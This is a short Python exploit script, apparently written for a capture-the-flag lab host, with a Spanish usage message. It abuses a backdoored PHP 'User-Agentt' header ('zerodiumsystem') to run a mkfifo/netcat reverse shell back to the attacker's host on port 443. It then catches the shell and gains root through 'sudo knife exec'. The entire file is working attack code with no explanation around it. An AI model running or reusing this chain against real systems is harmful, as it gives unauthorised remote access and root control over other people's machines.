#!/usr/bin/python3
from pwn import *
import requests

if len(sys.argv) < 2:
    print(f"\n\033[1;37m[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <lhost>\n")
    sys.exit(1)

def cmd():
    target = "http://10.10.10.242/"
    headers = {"User-Agentt": f"zerodiumsystem('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {sys.argv[1]} 443 >/tmp/f');"}
    requests.get(target, headers=headers)

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=30).wait_for_connection()
shell.sendline(b"sudo knife exec -E 'exec \"/bin/sh\"'")
shell.sendline(b"export HOME=/root TERM=xterm; cd")
shell.interactive()
